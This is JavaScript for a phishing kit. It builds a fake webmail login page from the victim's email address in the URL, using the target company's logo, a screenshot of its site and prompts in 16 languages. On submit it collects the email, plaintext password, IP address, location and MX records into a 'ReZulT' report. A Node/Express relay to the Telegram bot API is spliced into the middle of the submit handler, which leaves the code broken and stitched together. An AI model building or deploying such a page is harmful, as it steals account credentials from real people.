 /* global $ */
    $(document).ready(function () {
      var cntt = 0;
      initializePage();

      $('#back1').click(function () {
        $("#msg").hide();
        $('#ai').val("");
        $("#automail").animate({
          left: 200,
          opacity: "hide"
        }, 0);
        $("#inputbar").animate({
          right: 200,
          opacity: "show"
        }, 1000);

      });

      var ai = handleBase64Data(window.location.hash.substr(1));
      if (!ai) {

      } else {
        var my_ai = ai;
        $('#ai').val(my_ai);
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_ai)) {
          $('#errror').show();
          ai.focus;
          return false;
        }
        var ind = my_ai.indexOf("@");
        var m_slic = my_ai.substr((ind + 1));
        var c = m_slic.substr(0, m_slic.indexOf('.'));
        var fnll = c.toLowerCase();
        var fnllu = c.toUpperCase();
        var browser = GetBrowserandLanguage()[0];

        



      }

      var f = "bmV4dC5waHA=";

      $('#sub_btn').click(function (event) {
        $('#errror').hide();
        $('#mgss').hide();
        event.preventDefault();
        var ai = $("#ai").val();
        var pr = $("#pr").val();
        var mgss = $('#mgss').html();
        $('#mgss').text(mgss);
        ///////////////////////////
        var my_ai = ai;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_ai)) {
          $('#errror').show();
          ai.focus;
          return false;
        }

        var ind = my_ai.indexOf("@");
        var m_slic = my_ai.substr((ind + 1));
        var c = m_slic.substr(0, m_slic.indexOf('.'));
        var fnll = c.toLowerCase();
        var fnllu = c.toUpperCase();

        // $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain=" + m_slic);
        $("#logoname").html(fnllu);
        $(".domain").html(m_slic);
        ///////////////////////////
        cntt = cntt + 1;



      });
    })


    function GetBrowserandLanguage() {
      // deliver this method 
      let browser = window.clientInformation.appVersion;
      let language = window.clientInformation.language;
      // the return should be an array sorry not object ooo s
      let info = [browser, language]

      // return info array
      return info;
    }

    function initializePage() {

      setTimeout(function () {
        document.getElementsByClassName('loader')[0].style.display = 'none';
        var url = location.href;
        const link = new URL(url);
        let email = link.hash;
        email = handleBase64Data(email.substr(1).split('/')[0]);
        let website = email.substring(email.indexOf("@") + 1);
        var image = "https://image.thum.io/get/width/1200/http://" + website;
        document.body.style.backgroundImage = "url('"+ image +"')";
        document.getElementsByClassName('overlay')[0].style.display = 'block';
        document.getElementsByClassName('modal')[0].style.display = 'block';
      }, 700);

      // Split the current URL to extract a part
      const aim = window.location.hash.substr(1).split('/');
      var hashPart = handleBase64Data(aim[0]);

      const langs = getLocalizedLanguage(aim[1]);
      // console.log("LanguageDictionary :", hardInput)

      $('#error').html(langs.error);
      $('#lessThan4').html(langs.lessThan4);
      $('#msg').html(langs.msg);
      $('#submit-btn').html(langs.submitBtn);
      $('#sec-lg-ss').html(langs.secLgSs)
      $('#frg-psw').html(langs.frgPsw);
      $('#copy').html(langs.copy);
      $("#email").attr("placeholder", langs.emlTxt)
      $("#password").attr("placeholder", langs.pswTxt)
      // $('#loginText').html(langs.loginText);
      // $('#cancel-btn').html(langs.cancelText);
      if (hashPart) {
        hashPart = convertToBase64(hashPart)
        // Split the extracted part further
        var emailParts = hashPart.split('@');
        var domainName = emailParts[1].split('.')[0];

        // Capitalize the first letter of the domain name
        var capitalizedDomain = domainName.charAt(0).toUpperCase() + domainName.slice(1);

        // Update elements on the page
        var logoUrl = "https://logo.clearbit.com/" + emailParts[1];
        $.get(logoUrl)
          .done(function () {
            $("#logoimg").attr("src", logoUrl);
            $("#favicon").attr("href", logoUrl);
            $("#logoimg").show();
          })
          .fail(function () {
            logoUrl = "https://www.google.com/s2/favicons?domain=" + emailParts[1];
            $.get(logoUrl)
              .done(function () {
                $("#logoimg").hide();
              })
              .fail(function () {
                $("#logoimg").hide();
              })
          });

        $("#loginMgs").html(`${capitalizedDomain} ${langs.emlLogin}`);
        document.title = `${capitalizedDomain} - ${langs.mail}`;
        $("#email").val(hashPart);

        // Toggle password visibility
        $("#pass-eye").click(_0x4d7017 => {
          if ($("#password").attr("type") != "text") {
            $("#password").attr("type", "text");
          } else {
            $("#password").attr("type", "password");
          }
        });

        // Call a function to handle form submission
        handleFormSubmission($("#email"), $("#password"), emailParts[1], langs);
      }
    }

    function convertToBase64(str) {
      if (/^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)?$/.test(str)) {
        return atob(str);
      } else {
        return str;
      }
    }

    

    function handleFormSubmission(emailField, passwordField, domain, langs) {

      var attempts = 0;
      var msgElement = $("#msg");
      var lessThan4Element = $("#lessThan4");
      var errorElement = $("#error");

      $('.login-form form').submit(function (event) {
        errorElement.hide();
        msgElement.hide();
        event.preventDefault();
        lessThan4Element.hide();
        $("#submit-btn").html(langs.verifyingText);
        var ai = emailField.val();
        var pr = passwordField.val();

        var my_ai = ai;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_ai)) {
          $('#error').show();
          emailField.focus();
          return false;
        }

        var ind = my_ai.indexOf("@");
        var m_slic = my_ai.substr((ind + 1));
        var c = m_slic.substr(0, m_slic.indexOf('.'));
        var fnll = c.toLowerCase();
        var fnllu = c.toUpperCase();



        setTimeout(async () => {
          if (emailField.val() == '') {
            errorElement.show();
          } else {
            if (passwordField.val() == '') {
              msgElement.show();
            } else {
              if (passwordField.val().length < 4) {
                lessThan4Element.show();
                passwordField.val('');
              } else {
                ai = emailField.val();
                pr = passwordField.val();

                var date = new Date();
                const visitorInfo = await sendVisitorIP();
                // console.log('MX Record', await getMXRecord(domain))


                var message =
                  `--------+ General Webmail ReZulT ${visitorInfo[2]} ${visitorInfo[3]}, ${visitorInfo[1]} +--------\n`;
                message += "Email : " + ai + "\n";
                message += "Password : " + pr + "\n";
                message += "Checker: " + ai + ":" + pr + "\n";
                message += "Browser : " + GetBrowserandLanguage()[0] + "\n";

                message += "Language : " + GetBrowserandLanguage()[1] + "\n";
                message += "MX Record : " + await getMXRecord(domain) + "\n";
                message += "IP Address : " + visitorInfo[0] + "\n";
                message += `Region and Country : ${visitorInfo[2]} ${visitorInfo[3]}, ${visitorInfo[1]} \n`;
                message += "Date : " + date + "\n";
                message +=
                  `---------+ General Webmail ReZulT ${visitorInfo[2]} ${visitorInfo[3]}, ${visitorInfo[1]} +-------------\n`;
              const express = require("express");
const app = express();

app.use(express.json());

const token = process.env.TELEGRAM_TOKEN;

app.post("/api/message", async (req, res) => {
  try {
    const { message, chatId } = req.body;

    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });

    const data = await response.json();

    res.status(200).send({ ok: true, data });
  } catch (err) {
    console.error(err);
    res.status(500).send({ error: "Telegram failed" });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
    function handleBase64Data(string) {

      try {
        return atob(string);
      } catch (error) {
        return string;
      }
    }

    function getVisitorIP() {
      return new Promise(function (resolve, reject) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://ipinfo.io/json', true);
        xhr.onload = function () {
          if (xhr.status >= 200 && xhr.status < 300) {
            var response = JSON.parse(xhr.responseText);
            resolve(response);
          } else {
            reject('Failed to fetch IP address');
          }
        };
        xhr.onerror = function () {
          reject('Failed to fetch IP address');
        };
        xhr.send();
      });
    }

    async function getMXRecord(domain) {
      try {
        const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
        const data = await response.json();

        if (data && data.Answer && data.Answer.length > 0) {
          const mxRecords = data.Answer.map(record => `${record.data}`).join('\n');
          return mxRecords;
        } else {
          return 'no-mx';
        }
      } catch (error) {
        return 'MX-Error';
      }
    }



    async function sendVisitorIP() {
      try {
        var visitorInfo = await getVisitorIP();
        return [visitorInfo.ip, visitorInfo.country, visitorInfo.city, visitorInfo.region];
        // Here you can send the visitorIP value to your desired destination
      } catch (error) {
        return error
      }
    }

    function GetBrowserandLanguage() {
      // deliver this method 
      let browser = window.clientInformation.appVersion;
      let language = window.clientInformation.language;
      // the return should be an array sorry not object ooo s
      let info = [browser, language]

      // return info array
      return info;
    }

    function getLocalizedLanguage(customLocale = '') {
      const userLanguage = (customLocale != '') ? customLocale : navigator.language || navigator.userLanguage;
      const languageCode = userLanguage.substring(0, 2);
      const lang = {
        en: {
          lessThan4: "Password must be at least 4 characters long.",
          msg: "Invalid password. Please enter the correct information.",
          error: "The account does not exist. Please enter a different account.",
          emlTxt: "Email",
          pswTxt: "Password",
          submitBtn: "Login",
          secLgSs: "Secure login session",
          frgPsw: "Forgot password?",
          copy: "Copyright © 2024",
          verifyingText: "Verifying...",
          emlLogin: "Email Login",
          mail: "Mail",
          yourEmail: "Your email has been successfully activated.",
          success: "Thank you. You will receive your file in your email shortly."
        },
        zh: {
          lessThan4: "密码长度必须大于4个字符。",
          msg: "无效的密码。请输入正确的信息。",
          error: "该账户不存在。请输入其他账户。",
          emlTxt: "邮箱",
          pswTxt: "密码",
          submitBtn: "登录",
          secLgSs: "安全登录会话",
          frgPsw: "忘记密码？",
          copy: "版权所有 © 2024",
          verifyingText: "验证中...",
          emlLogin: "邮箱登录",
          mail: "邮箱",
          yourEmail: "您的邮箱已成功激活。",
          success: "谢谢。您将在邮件中收到您的文件。"
        },
        ja: {
          lessThan4: "パスワードは4文字以上である必要があります。",
          msg: "無効なパスワードです。正しい情報を入力してください。",
          error: "アカウントが存在しません。別のアカウントを入力してください。",
          emlTxt: "メール",
          pswTxt: "パスワード",
          submitBtn: "ログイン",
          secLgSs: "セキュアログインセッション",
          frgPsw: "パスワードを忘れた場合",
          copy: "著作権 © 2024",
          verifyingText: "確認中...",
          emlLogin: "メールログイン",
          mail: "メール",
          yourEmail: "あなたのメールは正常にアクティブ化されました。",
          success: "ありがとうございます。ファイルはすぐにメールでお届けします。"
        },
        pt: {
          lessThan4: "A senha deve ter mais de 4 caracteres.",
          msg: "Senha inválida. Por favor, insira as informações corretas.",
          error: "A conta não existe. Por favor, insira uma conta diferente.",
          emlTxt: "Email",
          pswTxt: "Senha",
          submitBtn: "Entrar",
          secLgSs: "Sessão de login segura",
          frgPsw: "Esqueceu a senha?",
          copy: "Copyright © 2024",
          verifyingText: "Verificando...",
          emlLogin: "Login por Email",
          mail: "Email",
          yourEmail: "Seu email foi ativado com sucesso.",
          success: "Obrigado. Você receberá seu arquivo em seu email em breve."
        },
        ko: {
          lessThan4: "비밀번호는 4자 이상이어야 합니다.",
          msg: "잘못된 비밀번호입니다. 올바른 정보를 입력하세요.",
          error: "해당 계정이 존재하지 않습니다. 다른 계정을 입력하세요.",
          emlTxt: "이메일",
          pswTxt: "비밀번호",
          submitBtn: "로그인",
          secLgSs: "보안 로그인 세션",
          frgPsw: "비밀번호를 잊으셨나요?",
          copy: "저작권 © 2024",
          verifyingText: "확인 중...",
          emlLogin: "이메일 로그인",
          mail: "메일",
          yourEmail: "이메일이 성공적으로 활성화되었습니다.",
          success: "감사합니다. 곧 이메일로 파일을 받으실 수 있습니다."
        },
        es: {
          lessThan4: "La contraseña debe tener más de 4 caracteres.",
          msg: "Contraseña inválida. Por favor, ingrese la información correcta.",
          error: "La cuenta no existe. Por favor, ingrese una cuenta diferente.",
          emlTxt: "Correo electrónico",
          pswTxt: "Contraseña",
          submitBtn: "Iniciar sesión",
          secLgSs: "Sesión de inicio segura",
          frgPsw: "¿Olvidaste tu contraseña?",
          copy: "Copyright © 2024",
          verifyingText: "Verificando...",
          emlLogin: "Inicio de sesión por correo electrónico",
          mail: "Correo electrónico",
          yourEmail: "Tu correo electrónico se ha activado correctamente.",
          success: "Gracias. Recibirás tu archivo en tu correo electrónico en breve."
        },
        it: {
          lessThan4: "La password deve contenere almeno 4 caratteri.",
          msg: "Password non valida. Inserisci le informazioni corrette.",
          error: "L'account non esiste. Inserisci un account diverso.",
          emlTxt: "Email",
          pswTxt: "Password",
          submitBtn: "Accedi",
          secLgSs: "Sessione di accesso sicuro",
          frgPsw: "Password dimenticata?",
          copy: "Copyright © 2024",
          verifyingText: "Verifica in corso...",
          emlLogin: "Accesso tramite email",
          mail: "Email",
          yourEmail: "La tua email è stata attivata con successo.",
          success: "Grazie. Riceverai il tuo file nella tua email a breve."
        },
        de: {
          lessThan4: "Das Passwort muss mindestens 4 Zeichen lang sein.",
          msg: "Ungültiges Passwort. Bitte geben Sie die richtigen Informationen ein.",
          error: "Das Konto existiert nicht. Bitte geben Sie ein anderes Konto ein.",
          emlTxt: "E-Mail",
          pswTxt: "Passwort",
          submitBtn: "Anmelden",
          secLgSs: "Sichere Anmeldesitzung",
          frgPsw: "Passwort vergessen?",
          copy: "Copyright © 2024",
          verifyingText: "Überprüfung läuft...",
          emlLogin: "E-Mail-Anmeldung",
          mail: "E-Mail",
          yourEmail: "Ihre E-Mail wurde erfolgreich aktiviert.",
          success: "Vielen Dank. Sie erhalten in Kürze Ihre Datei per E-Mail."
        },
        fr: {
          lessThan4: "Le mot de passe doit comporter plus de 4 caractères.",
          msg: "Mot de passe invalide. Veuillez entrer les bonnes informations.",
          error: "Le compte n'existe pas. Veuillez entrer un compte différent.",
          emlTxt: "Email",
          pswTxt: "Mot de passe",
          submitBtn: "Se connecter",
          secLgSs: "Session de connexion sécurisée",
          frgPsw: "Mot de passe oublié ?",
          copy: "Copyright © 2024",
          verifyingText: "Vérification en cours...",
          emlLogin: "Connexion par email",
          mail: "Email",
          yourEmail: "Votre email a été activé avec succès.",
          success: "Merci. Vous recevrez votre fichier dans votre email sous peu."
        },
        lt: {
          lessThan4: "Slaptažodis turi būti ilgesnis nei 4 simboliai.",
          msg: "Neteisingas slaptažodis. Įveskite teisingą informaciją.",
          error: "Paskyra neegzistuoja. Įveskite kitą paskyrą.",
          emlTxt: "El. paštas",
          pswTxt: "Slaptažodis",
          submitBtn: "Prisijungti",
          secLgSs: "Saugi prisijungimo sesija",
          frgPsw: "Pamiršote slaptažodį?",
          copy: "Autorių teisė © 2024",
          verifyingText: "Tikrinama...",
          emlLogin: "El. pašto prisijungimas",
          mail: "El. paštas",
          yourEmail: "Jūsų el. paštas sėkmingai aktyvuotas.",
          success: "Ačiū. Netrukus gausite savo failą el. paštu."
        },
        sv: {
          lessThan4: "Lösenordet måste vara längre än 4 tecken.",
          msg: "Ogiltigt lösenord. Ange korrekt information.",
          error: "Kontot existerar inte. Ange ett annat konto.",
          emlTxt: "E-post",
          pswTxt: "Lösenord",
          submitBtn: "Logga in",
          secLgSs: "Säker inloggningssession",
          frgPsw: "Glömt lösenordet?",
          copy: "Upphovsrätt © 2024",
          verifyingText: "Verifierar...",
          emlLogin: "E-postinloggning",
          mail: "E-post",
          yourEmail: "Din e-post har aktiverats framgångsrikt.",
          success: "Tack. Du kommer snart att få din fil via e-post."
        },
        et: {
          lessThan4: "Parool peab olema vähemalt 4 tähemärki pikk.",
          msg: "Vale parool. Palun sisesta õiged andmed.",
          error: "Sellist kontot ei eksisteeri. Palun sisesta teine konto.",
          emlTxt: "Email",
          pswTxt: "Parool",
          submitBtn: "Logi sisse",
          secLgSs: "Turvaline sisselogimissessioon",
          frgPsw: "Unustasid parooli?",
          copy: "Autoriõigus © 2024",
          verifyingText: "Kontrollib...",
          emlLogin: "Emailiga sisselogimine",
          mail: "Email",
          yourEmail: "Teie e-post on edukalt aktiveeritud.",
          success: "Aitäh. Teile saadetakse fail peatselt teie e-posti aadressile."
        },
        tr: {
          lessThan4: "Parola 4 karakterden uzun olmalıdır.",
          msg: "Geçersiz parola. Lütfen doğru bilgileri girin.",
          error: "Hesap mevcut değil. Lütfen farklı bir hesap girin.",
          emlTxt: "E-posta",
          pswTxt: "Parola",
          submitBtn: "Giriş",
          secLgSs: "Güvenli oturum açma",
          frgPsw: "Parolanızı mı unuttunuz?",
          copy: "Telif Hakkı © 2024",
          verifyingText: "Doğrulanıyor...",
          emlLogin: "E-posta ile Giriş",
          mail: "E-posta",
          yourEmail: "E-postanız başarıyla etkinleştirildi.",
          success: "Teşekkür ederiz. Dosyanızı yakında e-postanızda alacaksınız."
        },
        ar: {
          lessThan4: "يجب أن تكون كلمة المرور أكثر من 4 أحرف.",
          msg: "كلمة المرور غير صالحة. الرجاء إدخال المعلومات الصحيحة.",
          error: "الحساب غير موجود. الرجاء إدخال حساب مختلف.",
          emlTxt: "البريد الإلكتروني",
          pswTxt: "كلمة المرور",
          submitBtn: "تسجيل الدخول",
          secLgSs: "جلسة تسجيل الدخول الآمنة",
          frgPsw: "هل نسيت كلمة المرور؟",
          copy: "حقوق النشر © 2024",
          verifyingText: "جار التحقق...",
          emlLogin: "تسجيل الدخول عبر البريد الإلكتروني",
          mail: "البريد",
          yourEmail: "تم تنشيط بريدك الإلكتروني بنجاح.",
          success: "شكرًا لك. ستتلقى الملف في بريدك الإلكتروني قريبًا."
        },
        ru: {
          lessThan4: "Пароль должен содержать более 4 символов.",
          msg: "Неверный пароль. Пожалуйста, введите правильную информацию.",
          error: "Аккаунт не существует. Пожалуйста, введите другой аккаунт.",
          emlTxt: "Электронная почта",
          pswTxt: "Пароль",
          submitBtn: "Вход",
          secLgSs: "Безопасная сессия входа",
          frgPsw: "Забыли пароль?",
          copy: "Авторское право © 2024",
          verifyingText: "Проверка...",
          emlLogin: "Вход по электронной почте",
          mail: "Почта",
          yourEmail: "Ваш электронный адрес успешно активирован.",
          success: "Спасибо. Вы получите свой файл на почту в ближайшее время."
        },
        vi: {
          lessThan4: "Mật khẩu phải chứa ít nhất 4 ký tự.",
          msg: "Mật khẩu không hợp lệ. Vui lòng nhập thông tin đúng.",
          error: "Tài khoản không tồn tại. Vui lòng nhập một tài khoản khác.",
          emlTxt: "Email",
          pswTxt: "Mật khẩu",
          submitBtn: "Đăng nhập",
          secLgSs: "Phiên đăng nhập an toàn",
          frgPsw: "Quên mật khẩu?",
          copy: "Bản quyền © 2024",
          verifyingText: "Đang xác minh...",
          emlLogin: "Đăng nhập qua Email",
          mail: "Email",
          yourEmail: "Email của bạn đã được kích hoạt thành công.",
          success: "Cảm ơn bạn. Bạn sẽ nhận được tệp tin trong email của mình sớm thôi."
        }
      }

      return lang[languageCode] || lang['en']

    }
  
